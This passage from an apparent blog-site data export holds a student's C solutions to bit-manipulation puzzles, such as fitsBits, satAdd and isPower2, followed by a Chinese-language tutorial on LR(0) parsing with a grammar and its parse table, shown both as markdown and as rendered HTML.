n1,n2,n3;</span><br><span class=\"line\"></span><br><span class=\"line\">  y = y + (y&gt;&gt;<span class=\"number\">16</span>);</span><br><span class=\"line\">  n1 = y &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n2 = (y &gt;&gt; <span class=\"number\">4</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n3 = (y &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> n1+n2+n3+((y&gt;&gt;<span class=\"number\">12</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"copylsb\"><a class=\"markdownIt-Anchor\" href=\"#copylsb\"></a> copyLSB</h2>\n<p><strong>copyLSB - set all bits of result to least significant bit of x</strong></p>\n<p>比较简单</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">copyLSB</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (~(x&amp;<span class=\"number\">1</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"divpwr2\"><a class=\"markdownIt-Anchor\" href=\"#divpwr2\"></a> divpwr2</h2>\n<p><strong>divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</strong></p>\n<p>需要用一个偏置量bias，这题我是抄的，思路待补充。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">divpwr2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">  x += (y &amp; ((<span class=\"number\">1</span>&lt;&lt;n)+~<span class=\"number\">0</span>));</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x &gt;&gt;n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"evenbits\"><a class=\"markdownIt-Anchor\" href=\"#evenbits\"></a> evenBits</h2>\n<p><strong>evenBits - return word with all even-numbered bits set to 1</strong></p>\n<p>简单</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">evenBits</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0x55</span>|(<span class=\"number\">0x55</span>&lt;&lt;<span class=\"number\">8</span>)|(<span class=\"number\">0x55</span>&lt;&lt;<span class=\"number\">16</span>)|(<span class=\"number\">0x55</span>&lt;&lt;<span class=\"number\">24</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"fitsbits\"><a class=\"markdownIt-Anchor\" href=\"#fitsbits\"></a> fitsBits</h2>\n<p><strong>fitsBits - return 1 if x can be represented as an n-bit, two’s complement integer.</strong></p>\n<p>我感觉最难的题<br />\n假如x可以被n位bit表示，且x大于等于0时，那么x&gt;&gt;(n-1)一定等于0<br />\n如果x小于0，那么x&gt;&gt;(n-1)一定等于0xffffffff，即~(x&gt;&gt;(n-1))一定等于0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitsBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = x &gt;&gt; <span class=\"number\">31</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> z = n + (~<span class=\"number\">1</span>+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((!y)&amp;!(x&gt;&gt;z))|((y+<span class=\"number\">2</span>)&amp;!(~(x&gt;&gt;z)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"getbyte\"><a class=\"markdownIt-Anchor\" href=\"#getbyte\"></a> getByte</h2>\n<p><strong>getByte - Extract byte n from word x</strong></p>\n<p>简单的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getByte</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (x&gt;&gt;(n&lt;&lt;<span class=\"number\">3</span>))&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"isgreater\"><a class=\"markdownIt-Anchor\" href=\"#isgreater\"></a> isGreater</h2>\n<p>**isGreater - if x &gt; y  then return 1, else return 0 **</p>\n<p>先剔除两个整数异号的情况，然后就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isGreater</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> particular1 = (y&gt;&gt;<span class=\"number\">31</span>)&amp;<span class=\"number\">1</span>&amp;!(x&gt;&gt;<span class=\"number\">31</span>);</span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   * particular1 = 1 when x&gt;0 and y&lt;0</span></span><br><span class=\"line\"><span class=\"comment\">   * particular1 = 0 otherwise</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> particular2 = (x&gt;&gt;<span class=\"number\">31</span>)&amp;<span class=\"number\">1</span>&amp;!(y&gt;&gt;<span class=\"number\">31</span>);</span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   * particular2 = 1 when x&lt;0 and y&gt;0</span></span><br><span class=\"line\"><span class=\"comment\">   * particular2 = 0 otherwise</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   * if p1 = 1 return 1</span></span><br><span class=\"line\"><span class=\"comment\">   * else if p2=1 return 0</span></span><br><span class=\"line\"><span class=\"comment\">   * else return normal</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> particular1|((!particular2)&amp;((~x+<span class=\"number\">1</span>+y)&gt;&gt;<span class=\"number\">31</span>)&amp;<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"isnonnegative\"><a class=\"markdownIt-Anchor\" href=\"#isnonnegative\"></a> isNonNegative</h2>\n<p>**isNonNegative - return 1 if x &gt;= 0, return 0 otherwise **</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isNonNegative</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !(x&gt;&gt;<span class=\"number\">31</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"isnotequal\"><a class=\"markdownIt-Anchor\" href=\"#isnotequal\"></a> isNotEqual</h2>\n<p><strong>isNotEqual - return 0 if x == y, and 1 otherwise</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isNotEqual</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !!(x^y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ispower2\"><a class=\"markdownIt-Anchor\" href=\"#ispower2\"></a> isPower2</h2>\n<p><strong>isPower2 - returns 1 if x is a power of 2, and 0 otherwise</strong></p>\n<p>这道题不简单，但是思路已经忘记了，想起来再写。应该用了分组处理的办法</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isPower2</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask = <span class=\"number\">0x11</span>|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">8</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">16</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">24</span>);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = (x&amp;mask)+((x&gt;&gt;<span class=\"number\">1</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">2</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">3</span>)&amp;mask);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> n,n2,n3;</span><br><span class=\"line\"></span><br><span class=\"line\">  y = y + (y&gt;&gt;<span class=\"number\">16</span>);</span><br><span class=\"line\">  n = y &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n2 = (y &gt;&gt; <span class=\"number\">4</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n3 = (y &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n = n+n2+n3+((y&gt;&gt;<span class=\"number\">12</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((!(x&gt;&gt;<span class=\"number\">31</span>))&amp;(n&amp;<span class=\"number\">1</span>)&amp;!(n&gt;&gt;<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"leastbitpos\"><a class=\"markdownIt-Anchor\" href=\"#leastbitpos\"></a> leastBitPos</h2>\n<p><strong>leastBitPos - return a mask that marks the position of the least significant 1 bit. If x == 0, return 0</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">leastBitPos</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (~x+<span class=\"number\">1</span>) &amp; x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"logicalshift\"><a class=\"markdownIt-Anchor\" href=\"#logicalshift\"></a> logicalShift</h2>\n<p><strong>logicalShift - shift x to the right by n, using a logical shift</strong></p>\n<p>也没什么难度</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">logicalShift</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> mask = (<span class=\"number\">0xff</span>)|(<span class=\"number\">0xff</span>&lt;&lt;<span class=\"number\">8</span>);</span><br><span class=\"line\">  mask = mask | (mask&lt;&lt;<span class=\"number\">16</span>);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> (x&gt;&gt;n)&amp;(mask&gt;&gt;n);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"satadd\"><a class=\"markdownIt-Anchor\" href=\"#satadd\"></a> satAdd</h2>\n<p><strong>satAdd - adds two numbers but when positive overflow occurs, returns maximum possible value, and when negative overflow occurs, it returns minimum positive value.</strong></p>\n<p>我自认为第二难的一道题<br />\n如果产生positive overflow，x+y&lt;x<br />\n如果产生negative overflow，x+y&gt;x</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">satAdd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> out = x + y;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask1 = (~(x&gt;&gt;<span class=\"number\">31</span>))&amp;(~(y&gt;&gt;<span class=\"number\">31</span>))&amp;(out&gt;&gt;<span class=\"number\">31</span>); <span class=\"comment\">// if positive overflow, mask1 = -1, or = 0</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask2 = (x&gt;&gt;<span class=\"number\">31</span>)&amp;(y&gt;&gt;<span class=\"number\">31</span>)&amp;(~(out&gt;&gt;<span class=\"number\">31</span>)); <span class=\"comment\">// if negative overflow, mask2 = -1, or = 0</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> Min = <span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> Max = Min+(~<span class=\"number\">1</span>+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((~mask1)&amp;(~mask2)&amp;(x+y))|(mask1&amp;Max)|(mask2&amp;Min);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tc2sm\"><a class=\"markdownIt-Anchor\" href=\"#tc2sm\"></a> tc2sm</h2>\n<p><strong>tc2sm - Convert from two’s complement to sign-magnitude where the MSB is the sign bit</strong></p>\n<p>简单的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tc2sm</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask = x &gt;&gt; <span class=\"number\">31</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (mask&amp;(<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>))|((x^mask)+(mask&amp;<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"LR分析法","top_img":false,"cover":"/img/compiler.jpg","date":"2020-11-30T05:05:40.000Z","katex":true,"_content":"\nLR分析法是比较麻烦的一种自底向上的分析方法。整体思路在于**寻找句柄**和**最左规约**。\n\n在分析字符串时，将待分析字符串从左至右push到stack中，一旦出现句柄，就规约。需要构造一个**LR(0)分析表**\n\n## LR(0)分析法\n\n### 一个例子\n文法$G[S]$：\n$$\n\\begin{aligned}\n&E\\rightarrow aA \\\\\n&E\\rightarrow bB\\\\\n&A\\rightarrow cA\\\\\n&A\\rightarrow d\\\\\n&B\\rightarrow cB\\\\\n&B\\rightarrow d\n\\end{aligned}\n$$\n把该文法托广：\n\n$$\n\\begin{aligned}\n&0.\\;S^{'}\\rightarrow E\\\\\n&1.\\;E\\rightarrow aA \\\\\n&2.\\;E\\rightarrow bB\\\\\n&3.\\;A\\rightarrow cA\\\\\n&4.\\;A\\rightarrow d\\\\\n&5.\\;B\\rightarrow cB\\\\\n&6.\\;B\\rightarrow d\n\\end{aligned}\n$$\n\n推出识别**活前缀**的DFA：\n{% img \"/img/com.png\" %}\n\n得到DFA后由此得到LR(0)分析表：\n\n| 状态 | a     | b     | c     | d     | $     | E    | A    | B    |\n| ---- | ----- | ----- | ----- | ----- | ----- | ---- | ---- | ---- |\n| 0    | $S_1$ | $S_2$ |       |       |       | $3$  |      |      |\n| 1    |       |       | $S_4$ | $S_5$ |       |      | $6$  |      |\n| 2    |       |       | $S_7$ | $S_8$ |       |      |      | $9$  |\n| 3    |       |       |       |       | $acc$ |      |      |      |\n| 4    |       |       | $S_4$ | $S_5$ |       |      | $10$ |      |\n| 5    | $r_4$ | $r_4$ | $r_4$ | $r_4$ | $r_4$ |      |      |      |\n| 6    | $r_1$ | $r_1$ | $r_1$ | $r_1$ | $r_1$ |      |      |      |\n| 7    |       |       | $S_7$ | $S_8$ |       |      |      | $11$ |\n| 8    | $r_6$ | $r_6$ | $r_6$ | $r_6$ | $r_6$ |      |      |      |\n| 9    | $r_2$ | $r_2$ | $r_2$ | $r_2$ | $r_2$ |      |      |      |\n| 10   | $r_3$ | $r_3$ | $r_3$ | $r_3$ | $r_3$ |      |      |      |\n| 11   | $r_5$ | $r_5$ | $r_5$ | $r_5$ | $r_5$ |      |      |      |\n\n在得到分析表后，对于任意字符串，从**状态0**开始，启动自动机。对于读入的下一个字符$\\alpha$与当前的状态，定位到分析表中的元素。\n- 如果该元素是$S_{j}$，则将这个字符push to stack，并且从当前状态转换到状态$j$。\n- 如果该元素是$r_{j}$，则根据（扩展）文法中第$j$条规则，从stack中pop出**与该规则右部字符串长度相同个数的字符**；然后把规则左部的**非终结字符**push to stack，如果该非终结字符为$A$，则当前状态转换到分析表中**当前状态**和$A$所定位到的状态数。\n- 如果遇到分析表中的空值，则抛出一个error，分析出错。\n- 如果遇到$acc$，分析结束。\n\nLR(0)的分析逻辑还算比较简单，但仍然有几个问题未解决：\n1. 文法的活前缀是什么？\n2. 如何得到文法活前缀的DFA？\n3. 如何由DFA得到分析表？\n\n\n### 文法的活前缀\n#### 前缀\n字符串的前缀是指字符串的任意首部。比如，$abc$的前缀有：$\\epsilon,\\;a,\\;ab,\\;abc$。\n\n#### 规范句型的活前缀\n>回溯学习：规范句型是什么?\n>用规范推导所推导出的句型称为规范句型。\n>回溯学习：什么是规范推导？\n>规范推导就是最右推导，这与自底向上分析法中**最左规约**是相对应的。\n>\n\n而规范句型的活前缀，是指规范句型中、**不包含句柄右边任何符号**的前缀。\n>回溯学习：句柄是什么？\n>句柄是一个句型的最左直接短语。\n>\n>那直接短语又是什么？\n>\n>假设$\\alpha \\beta \\delta$是文法$G$的一个句型，如果有\n>$$\n>S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A \\Rightarrow \\beta\n>$$\n>则称$\\beta$是相对于非终结字符$A$的、句型$\\alpha \\beta \\delta$的一个直接短语。\n\n\n从LR分析法的定义也能看出，当所分析的输入串没有语法错误时，每时每刻的stack里的符号与剩余的输入符号串都能形成一个规范句型。\n并且，如果stack中一旦存在**句柄**，那它立马就会被规约了，直到没有句柄为止。\n\n那就很明显了，实际上，stack中的字符就是**规范句型的活前缀**。那么，问题就转化为能不能将stack中的字符串识别为一个规范句型活前缀了。\n\n#### LR(0)项目\n由前文的活前缀定义，在一个规范句型的活前缀中，绝不含有句柄右边的任何符号，但仍然有可能含有或不含句柄的部分符号。因此会有三种情形：\n1. 活前缀中已经含有句柄的全部字符。也就是说，某一规则$A \\rightarrow \\alpha$的右部已经出现在了stack顶端，此时应该进行规约。\n2. 活前缀中只含有句柄的一部分字符。假如说存在一个规则$A \\rightarrow \\alpha_1 \\alpha_2$，那只有$\\alpha_1$在stack顶端，需要继续输入字符。\n3. 活前缀中完全没有任何句柄的符号，需要输入字符。","source":"_posts/LR分析法.md","raw":"---\ntitle: LR分析法\ntop_img: false\ncover: /img/compiler.jpg\ndate: 2020-11-30 13:05:40\ntags:\n- 编译原理\nkatex: true\n---\n\nLR分析法是比较麻烦的一种自底向上的分析方法。整体思路在于**寻找句柄**和**最左规约**。\n\n在分析字符串时，将待分析字符串从左至右push到stack中，一旦出现句柄，就规约。需要构造一个**LR(0)分析表**\n\n## LR(0)分析法\n\n### 一个例子\n文法$G[S]$：\n$$\n\\begin{aligned}\n&E\\rightarrow aA \\\\\n&E\\rightarrow bB\\\\\n&A\\rightarrow cA\\\\\n&A\\rightarrow d\\\\\n&B\\rightarrow cB\\\\\n&B\\rightarrow d\n\\end{aligned}\n$$\n把该文法托广：\n\n$$\n\\begin{aligned}\n&0.\\;S^{'}\\rightarrow E\\\\\n&1.\\;E\\rightarrow aA \\\\\n&2.\\;E\\rightarrow bB\\\\\n&3.\\;A\\rightarrow cA\\\\\n&4.\\;A\\rightarrow d\\\\\n&5.\\;B\\rightarrow cB\\\\\n&6.\\;B\\rightarrow d\n\\end{aligned}\n$$\n\n推出识别**活前缀**的DFA：\n{% img \"/img/com.png\" %}\n\n得到DFA后由此得到LR(0)分析表：\n\n| 状态 | a     | b     | c     | d     | $     | E    | A    | B    |\n| ---- | ----- | ----- | ----- | ----- | ----- | ---- | ---- | ---- |\n| 0    | $S_1$ | $S_2$ |       |       |       | $3$  |      |      |\n| 1    |       |       | $S_4$ | $S_5$ |       |      | $6$  |      |\n| 2    |       |       | $S_7$ | $S_8$ |       |      |      | $9$  |\n| 3    |       |       |       |       | $acc$ |      |      |      |\n| 4    |       |       | $S_4$ | $S_5$ |       |      | $10$ |      |\n| 5    | $r_4$ | $r_4$ | $r_4$ | $r_4$ | $r_4$ |      |      |      |\n| 6    | $r_1$ | $r_1$ | $r_1$ | $r_1$ | $r_1$ |      |      |      |\n| 7    |       |       | $S_7$ | $S_8$ |       |      |      | $11$ |\n| 8    | $r_6$ | $r_6$ | $r_6$ | $r_6$ | $r_6$ |      |      |      |\n| 9    | $r_2$ | $r_2$ | $r_2$ | $r_2$ | $r_2$ |      |      |      |\n| 10   | $r_3$ | $r_3$ | $r_3$ | $r_3$ | $r_3$ |      |      |      |\n| 11   | $r_5$ | $r_5$ | $r_5$ | $r_5$ | $r_5$ |      |      |      |\n\n在得到分析表后，对于任意字符串，从**状态0**开始，启动自动机。对于读入的下一个字符$\\alpha$与当前的状态，定位到分析表中的元素。\n- 如果该元素是$S_{j}$，则将这个字符push to stack，并且从当前状态转换到状态$j$。\n- 如果该元素是$r_{j}$，则根据（扩展）文法中第$j$条规则，从stack中pop出**与该规则右部字符串长度相同个数的字符**；然后把规则左部的**非终结字符**push to stack，如果该非终结字符为$A$，则当前状态转换到分析表中**当前状态**和$A$所定位到的状态数。\n- 如果遇到分析表中的空值，则抛出一个error，分析出错。\n- 如果遇到$acc$，分析结束。\n\nLR(0)的分析逻辑还算比较简单，但仍然有几个问题未解决：\n1. 文法的活前缀是什么？\n2. 如何得到文法活前缀的DFA？\n3. 如何由DFA得到分析表？\n\n\n### 文法的活前缀\n#### 前缀\n字符串的前缀是指字符串的任意首部。比如，$abc$的前缀有：$\\epsilon,\\;a,\\;ab,\\;abc$。\n\n#### 规范句型的活前缀\n>回溯学习：规范句型是什么?\n>用规范推导所推导出的句型称为规范句型。\n>回溯学习：什么是规范推导？\n>规范推导就是最右推导，这与自底向上分析法中**最左规约**是相对应的。\n>\n\n而规范句型的活前缀，是指规范句型中、**不包含句柄右边任何符号**的前缀。\n>回溯学习：句柄是什么？\n>句柄是一个句型的最左直接短语。\n>\n>那直接短语又是什么？\n>\n>假设$\\alpha \\beta \\delta$是文法$G$的一个句型，如果有\n>$$\n>S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A \\Rightarrow \\beta\n>$$\n>则称$\\beta$是相对于非终结字符$A$的、句型$\\alpha \\beta \\delta$的一个直接短语。\n\n\n从LR分析法的定义也能看出，当所分析的输入串没有语法错误时，每时每刻的stack里的符号与剩余的输入符号串都能形成一个规范句型。\n并且，如果stack中一旦存在**句柄**，那它立马就会被规约了，直到没有句柄为止。\n\n那就很明显了，实际上，stack中的字符就是**规范句型的活前缀**。那么，问题就转化为能不能将stack中的字符串识别为一个规范句型活前缀了。\n\n#### LR(0)项目\n由前文的活前缀定义，在一个规范句型的活前缀中，绝不含有句柄右边的任何符号，但仍然有可能含有或不含句柄的部分符号。因此会有三种情形：\n1. 活前缀中已经含有句柄的全部字符。也就是说，某一规则$A \\rightarrow \\alpha$的右部已经出现在了stack顶端，此时应该进行规约。\n2. 活前缀中只含有句柄的一部分字符。假如说存在一个规则$A \\rightarrow \\alpha_1 \\alpha_2$，那只有$\\alpha_1$在stack顶端，需要继续输入字符。\n3. 活前缀中完全没有任何句柄的符号，需要输入字符。","slug":"LR分析法","published":1,"updated":"2020-12-10T08:07:40.160Z","_id":"ckiszi5a5000698wage1ph83w","comments":1,"layout":"post","photos":[],"link":"","content":"<p>LR分析法是比较麻烦的一种自底向上的分析方法。整体思路在于<strong>寻找句柄</strong>和<strong>最左规约</strong>。</p>\n<p>在分析字符串时，将待分析字符串从左至右push到stack中，一旦出现句柄，就规约。需要构造一个<strong>LR(0)分析表</strong></p>\n<h2 id=\"lr0分析法\"><a class=\"markdownIt-Anchor\" href=\"#lr0分析法\"></a> LR(0)分析法</h2>\n<h3 id=\"一个例子\"><a class=\"markdownIt-Anchor\" href=\"#一个例子\"></a> 一个例子</h3>\n<p>文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo stretchy=\"false\">[</mo><mi>S</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">G[S]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mopen\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose\">]</span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>E</mi><mo>→</mo><mi>a</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>E</mi><mo>→</mo><mi>b</mi><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><mi>c</mi><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><mi>d</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" 